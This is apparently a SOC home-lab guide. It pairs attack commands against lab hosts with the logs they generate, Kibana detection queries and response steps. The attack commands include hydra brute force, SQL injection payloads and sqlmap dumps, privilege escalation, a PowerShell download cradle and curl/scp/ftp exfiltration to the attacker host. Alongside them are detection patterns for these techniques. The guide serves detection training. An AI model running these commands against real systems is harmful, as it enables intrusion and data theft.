# Attack Scenarios with Log Collection Examples

## Overview

This document provides detailed attack scenarios designed to generate realistic security logs that will be collected by your SIEM (192.168.1.20). Each scenario includes:
- Attack commands
- Expected log entries
- Detection queries for Kibana
- Incident response steps

## 🎯 Lab Network Reference

| System | IP Address | Purpose |
|--------|------------|---------|
| SOC-DC1 | 192.168.1.10 | Domain Controller |
| SIEM-ELK | 192.168.1.20 | Log collection & analysis |
| WIN10-VULN | 192.168.1.30 | Windows target |
| UBUNTU-VULN | 192.168.1.40 | Linux target |
| KALI-ATTACKER | 192.168.1.50 | Attack source |

**SIEM Dashboard**: http://192.168.1.20:5601

---

## Scenario 1: SSH Brute Force Attack

### 🎯 Objective
Simulate a brute force attack against SSH server and detect it in SIEM.

### 🔴 Attack Steps (From Kali - 192.168.1.50)

```bash
# Create small password list
cat > /tmp/passwords.txt << EOF
admin
password
123456
ubuntu
test
letmein
Password123!
EOF

# Launch brute force attack
hydra -l admin -P /tmp/passwords.txt ssh://192.168.1.40 -t 4

# Alternative: More aggressive attack
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.40 -t 10
```

### 📊 Logs Generated

**On Ubuntu Server (192.168.1.40):**
- **/var/log/auth.log**:
```
Dec 15 10:23:45 ubuntu-vuln sshd[1234]: Failed password for admin from 192.168.1.50 port 54321 ssh2
Dec 15 10:23:46 ubuntu-vuln sshd[1235]: Failed password for admin from 192.168.1.50 port 54322 ssh2
Dec 15 10:23:47 ubuntu-vuln sshd[1236]: Failed password for admin from 192.168.1.50 port 54323 ssh2
Dec 15 10:23:48 ubuntu-vuln sshd[1237]: Accepted password for admin from 192.168.1.50 port 54324 ssh2
```

**Sent to SIEM via:**
- Filebeat → Logstash (Port 5044)
- Rsyslog → Logstash (Port 514)

### 🔍 Detection in Kibana

**Query 1: Failed SSH Attempts**
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"message": "Failed password"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}
```

**Query 2: SSH Brute Force Detection (5+ failures in 1 minute)**
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event_category": "ssh_failed_login"}},
        {"match": {"src_ip": "192.168.1.50"}}
      ]
    }
  },
  "aggs": {
    "attacks_by_minute": {
      "date_histogram": {
        "field": "@timestamp",
        "interval": "1m"
      }
    }
  }
}
```

**Kibana Visualization:**
1. Open **Discover**
2. Search: `log_type:auth AND "Failed password" AND src_ip:192.168.1.50`
3. View timeline of attacks
4. Create alert rule: **> 5 failed attempts in 1 minute**

### 🛡️ Incident Response

```bash
# On Ubuntu server - Block attacker
sudo ufw deny from 192.168.1.50

# Check auth logs
sudo grep "192.168.1.50" /var/log/auth.log

# Check if any successful logins
sudo grep "Accepted password.*192.168.1.50" /var/log/auth.log

# Lock compromised account if successful
sudo passwd -l admin
```

---

## Scenario 2: Web Application SQL Injection

### 🎯 Objective
Exploit SQL injection vulnerability in DVWA and detect via web server logs.

### 🔴 Attack Steps (From Kali - 192.168.1.50)

```bash
# Basic SQL injection test
curl "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#"

# Database enumeration
curl "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null,table_name FROM information_schema.tables--&Submit=Submit"

# Dump user data
curl "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--&Submit=Submit"

# Using SQLMap (automated)
sqlmap -u "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=test" \
  --dbs --batch

# Extract data
sqlmap -u "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=test" \
  -D dvwa -T users --dump
```

### 📊 Logs Generated

**On Ubuntu Server (192.168.1.40):**
- **/var/log/apache2/access.log**:
```
192.168.1.50 - - [15/Dec/2024:10:30:45 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1" 200 3456 "-" "curl/7.88.1"
192.168.1.50 - - [15/Dec/2024:10:30:46 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 200 4567 "-" "curl/7.88.1"
```

**Sent to SIEM via:**
- Filebeat → Logstash (Port 5044)

### 🔍 Detection in Kibana

**Query: SQL Injection Patterns**
```json
{
  "query": {
    "bool": {
      "should": [
        {"match_phrase": {"message": "' OR '1'='1"}},
        {"match_phrase": {"message": "UNION SELECT"}},
        {"match_phrase": {"message": "information_schema"}},
        {"match_phrase": {"message": "' AND '1'='1"}},
        {"match_phrase": {"message": "'; DROP TABLE"}},
        {"match_phrase": {"message": "' OR 1=1--"}}
      ],
      "minimum_should_match": 1,
      "filter": [
        {"term": {"log_type": "apache_access"}}
      ]
    }
  }
}
```

**Kibana Detection:**
1. **Discover** → Search: `log_type:apache_access AND (UNION SELECT OR "OR '1'='1" OR information_schema)`
2. Group by source IP
3. Create alert: SQL injection patterns detected

### 🛡️ Incident Response

```bash
# On Ubuntu server - Check Apache logs
sudo grep -i "union select\|' or \|information_schema" /var/log/apache2/access.log

# Block attacker IP
sudo ufw deny from 192.168.1.50

# Check for successful data exfiltration
sudo grep "200" /var/log/apache2/access.log | grep "192.168.1.50" | wc -l

# Patch vulnerability - Update DVWA security level
# Access: http://192.168.1.40/dvwa/security.php
# Set to "High"
```

---

## Scenario 3: RDP Brute Force (Windows)

### 🎯 Objective
Attempt to brute force RDP login and detect via Windows event logs.

### 🔴 Attack Steps (From Kali - 192.168.1.50)

```bash
# Create password list
cat > /tmp/rdp-pass.txt << EOF
admin
password
Admin123
Password123!
Welcome1
EOF

# RDP brute force
hydra -l Administrator -P /tmp/rdp-pass.txt rdp://192.168.1.30 -t 2

# Alternative with more threads (faster)
hydra -l admin -P /tmp/rdp-pass.txt rdp://192.168.1.30 -t 4 -V
```

### 📊 Logs Generated

**On Windows 10 (192.168.1.30):**
- **Event ID 4625** - Failed Logon Attempts
- **Event ID 4624** - Successful Logon (if password found)

**Security Event Log Entry (Event ID 4625):**
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4625</EventID>
    <Level>0</Level>
    <Task>12544</Task>
    <Keywords>0x8010000000000000</Keywords>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-0-0</Data>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="Status">0xc000006d</Data>
    <Data Name="FailureReason">Unknown user name or bad password</Data>
    <Data Name="WorkstationName">KALI-ATTACKER</Data>
    <Data Name="IpAddress">192.168.1.50</Data>
    <Data Name="IpPort">54321</Data>
  </EventData>
</Event>
```

**Sent to SIEM via:**
- Winlogbeat → Logstash (Port 5044)

### 🔍 Detection in Kibana

**Query: RDP Brute Force**
```json
{
  "query": {
    "bool": {
      "must": [
        {"term": {"winlog.event_id": 4625}},
        {"term": {"winlog.event_data.LogonType": 3}},
        {"range": {"@timestamp": {"gte": "now-5m"}}}
      ]
    }
  },
  "aggs": {
    "failed_by_source": {
      "terms": {
        "field": "source.ip",
        "size": 10
      }
    }
  }
}
```

**Kibana Detection:**
1. Search: `winlog.event_id:4625 AND winlog.event_data.IpAddress:192.168.1.50`
2. Visualize: Timeline of failed RDP attempts
3. Alert: **> 5 Event ID 4625 from same IP in 5 minutes**

### 🛡️ Incident Response

**On Windows 10 (PowerShell):**
```powershell
# View failed RDP attempts
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
  Where-Object {$_.Properties[19].Value -eq '192.168.1.50'} |
  Select-Object -First 20

# Block attacker IP
New-NetFirewallRule -DisplayName "Block Attacker" `
  -Direction Inbound -RemoteAddress 192.168.1.50 -Action Block

# Check for successful logins
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
  Where-Object {$_.Properties[18].Value -eq '192.168.1.50'}

# Account lockout if compromised
net user Administrator /active:no
```

---

## Scenario 4: Network Reconnaissance Scan

### 🎯 Objective
Perform network scan and detect via Suricata IDS on SIEM.

### 🔴 Attack Steps (From Kali - 192.168.1.50)

```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Port scan - TCP SYN scan
nmap -sS 192.168.1.30 -p 1-1000

# Service version detection
nmap -sV 192.168.1.30 -p 80,443,445,3389,5985

# OS detection
nmap -O 192.168.1.30

# Aggressive scan
nmap -A 192.168.1.30

# Full port scan
nmap -p- -T4 192.168.1.30
```

### 📊 Logs Generated

**On SIEM Server (192.168.1.20):**
- **Suricata EVE Log** - `/var/log/suricata/eve.json`

```json
{
  "timestamp": "2024-12-15T10:45:30.123456+0000",
  "flow_id": 123456789,
  "event_type": "alert",
  "src_ip": "192.168.1.50",
  "src_port": 54321,
  "dest_ip": "192.168.1.30",
  "dest_port": 445,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2001219,
    "rev": 20,
    "signature": "ET SCAN Potential SSH Scan",
    "category": "Attempted Information Leak",
    "severity": 2
  }
}
```

### 🔍 Detection in Kibana

**Query: Port Scanning Activity**
```json
{
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "alert"}},
        {"match": {"alert.signature": "scan"}},
        {"term": {"src_ip": "192.168.1.50"}}
      ]
    }
  },
  "aggs": {
    "scans_by_dest": {
      "terms": {
        "field": "dest_ip",
        "size": 10
      }
    }
  }
}
```

**Kibana Visualization:**
1. Search: `event_type:alert AND alert.signature:scan AND src_ip:192.168.1.50`
2. Create visualization: Bar chart of scanned ports
3. Network map: Source → Destination flows

### 🛡️ Incident Response

**On SIEM Server:**
```bash
# Check Suricata alerts
sudo grep "scan" /var/log/suricata/fast.log

# View detailed alerts
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# Get scanning source statistics
sudo jq -r 'select(.event_type=="alert") | .src_ip' /var/log/suricata/eve.json | sort | uniq -c
```

**Block Attacker:**
```bash
# On all systems - Block 192.168.1.50
sudo ufw deny from 192.168.1.50

# On Windows
New-NetFirewallRule -DisplayName "Block Scanner" `
  -Direction Inbound -RemoteAddress 192.168.1.50 -Action Block
```

---

## Scenario 5: Privilege Escalation (Windows)

### 🎯 Objective
Escalate privileges on Windows and detect via Sysmon and Security logs.

### 🔴 Attack Steps (After initial access on WIN10-VULN)

```powershell
# Check current user
whoami
whoami /priv

# Search for credentials in files
findstr /si password *.txt *.xml *.config

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Exploit unquoted service path
sc query "VulnerableService"
sc config "VulnerableService" binpath= "C:\Temp\malicious.exe"
sc start "VulnerableService"

# Check admin group membership
net localgroup administrators

# Attempt to add user to admin group
net localgroup administrators lowpriv /add
```

### 📊 Logs Generated

**Event ID 4672** - Special privileges assigned (Admin logon)
**Event ID 4720** - User account created
**Event ID 4732** - Member added to security-enabled local group
**Sysmon Event ID 1** - Process creation
**Sysmon Event ID 10** - Process access

### 🔍 Detection in Kibana

**Query: Privilege Escalation Indicators**
```json
{
  "query": {
    "bool": {
      "should": [
        {"term": {"winlog.event_id": 4672}},
        {"term": {"winlog.event_id": 4732}},
        {"term": {"winlog.event_id": 4720}},
        {
          "bool": {
            "must": [
              {"term": {"winlog.event_id": 1}},
              {"match": {"process.command_line": "net localgroup administrators"}}
            ]
          }
        }
      ],
      "minimum_should_match": 1
    }
  }
}
```

---

## Scenario 6: Malware Execution (Simulated)

### 🎯 Objective
Simulate malware execution and detect via Sysmon and process creation logs.

### 🔴 Attack Steps (On WIN10-VULN)

```powershell
# Download "malware" (actually harmless test file)
Invoke-WebRequest -Uri "http://192.168.1.50:8000/test-malware.exe" -OutFile "C:\Temp\malware.exe"

# Execute from suspicious location
C:\Temp\malware.exe

# PowerShell download cradle (common malware technique)
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.50:8000/script.ps1'))"

# Encoded command
powershell.exe -enc <base64_encoded_command>
```

### 📊 Logs Generated

**Sysmon Event ID 1** - Process Creation
**Sysmon Event ID 3** - Network Connection
**Sysmon Event ID 11** - File Created
**PowerShell Event ID 4104** - Script Block Logging

### 🔍 Detection in Kibana

**Query: Suspicious Process Execution**
```json
{
  "query": {
    "bool": {
      "should": [
        {"match": {"process.executable": "C:\\Temp\\*.exe"}},
        {"match": {"process.command_line": "-enc"}},
        {"match": {"process.command_line": "IEX"}},
        {"match": {"process.command_line": "downloadstring"}},
        {"match": {"process.parent.name": "cmd.exe"}},
        {
          "bool": {
            "must": [
              {"term": {"process.name": "powershell.exe"}},
              {"match": {"process.command_line": "-w hidden"}}
            ]
          }
        }
      ],
      "minimum_should_match": 1
    }
  }
}
```

---

## Scenario 7: Data Exfiltration

### 🎯 Objective
Simulate data theft and detect large data transfers.

### 🔴 Attack Steps

**On Ubuntu Server (after compromise):**
```bash
# Create fake sensitive data
echo "Sensitive Data: Credit Card Numbers" > /tmp/exfil-data.txt
echo "4111-1111-1111-1111" >> /tmp/exfil-data.txt

# Exfiltrate via HTTP POST
curl -X POST -F "file=@/tmp/exfil-data.txt" http://192.168.1.50:8000/upload

# Exfiltrate via SCP
scp /tmp/exfil-data.txt kali@192.168.1.50:/tmp/

# Exfiltrate via FTP
ftp 192.168.1.50 << EOF
put /tmp/exfil-data.txt
bye
EOF
```

### 🔍 Detection in Kibana

**Query: Large Outbound Transfers**
```json
{
  "query": {
    "bool": {
      "must": [
        {"range": {"network.bytes": {"gte": 1000000}}},
        {"term": {"network.direction": "outbound"}},
        {"match": {"source.ip": "192.168.1.40"}}
      ]
    }
  }
}
```

---

## 🎓 Practice Exercises

### Exercise 1: Multi-Stage Attack
1. Perform reconnaissance (Kali → Ubuntu)
2. Exploit SSH (brute force)
3. Escalate privileges
4. Exfiltrate data
5. **Track the entire kill chain in Kibana**

### Exercise 2: Create Detection Rule
1. Choose an attack scenario
2. Create custom Kibana detection rule
3. Set up alert notification
4. Test alert triggers correctly

### Exercise 3: Incident Response
1. Run Scenario 1 (SSH Brute Force)
2. Detect in Kibana
3. Create incident report
4. Block attacker
5. Verify remediation

### Exercise 4: Threat Hunting
1. Generate "background noise" (normal traffic)
2. Hide one attack in the noise
3. Use Kibana to hunt for the attack
4. Document your methodology

---

## 📊 Kibana Dashboard Setup

### Create SOC Dashboard

1. **Go to Kibana**: http://192.168.1.20:5601
2. **Stack Management** → **Index Patterns** → Create `soc-lab-*`
3. **Dashboard** → **Create New Dashboard**

**Add Visualizations:**

1. **Failed Login Attempts** (Line chart)
   - Index: `soc-lab-*`
   - Y-axis: Count
   - X-axis: @timestamp
   - Filter: `event_category:*failed*`

2. **Top Attack Sources** (Pie chart)
   - Bucket: Terms on `src_ip`
   - Filter: `event_type:alert OR event_category:*failed*`

3. **Attack Timeline** (Timeline)
   - All events with tags: attack, alert, failed

4. **Web Attacks** (Data table)
   - Rows: `message`
   - Filter: `log_type:apache_access AND (UNION SELECT OR "' OR")`

---

## 🔒 Important Reminders

### Lab Safety
⚠️ **Never run these attacks outside the lab environment**
⚠️ **Ensure network isolation is maintained**
⚠️ **All attacks must originate from 192.168.1.50 only**
⚠️ **Document all activities with timestamps**

### Verification Checklist
- [ ] SIEM is receiving logs from all systems
- [ ] Kibana dashboard shows recent events
- [ ] Suricata is generating alerts
- [ ] Winlogbeat is forwarding Windows events
- [ ] Filebeat is forwarding Linux logs

### Clean Up After Testing
```bash
# On all systems - Reset firewall rules
sudo ufw --force reset
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw enable

# On Windows (PowerShell)
Remove-NetFirewallRule -DisplayName "Block*"

# On SIEM - Clear old indices
curl -X DELETE "localhost:9200/soc-lab-*"
```

---

## 📚 Additional Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Elastic Security Detection Rules](https://github.com/elastic/detection-rules)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [Suricata Rules](https://suricata.readthedocs.io/en/latest/rules/)

## 🎯 Next Steps

1. ✅ Complete all attack scenarios
2. ✅ Create detection rules for each
3. ✅ Build comprehensive Kibana dashboard
4. ✅ Write incident response playbooks
5. ✅ Practice full incident response lifecycle
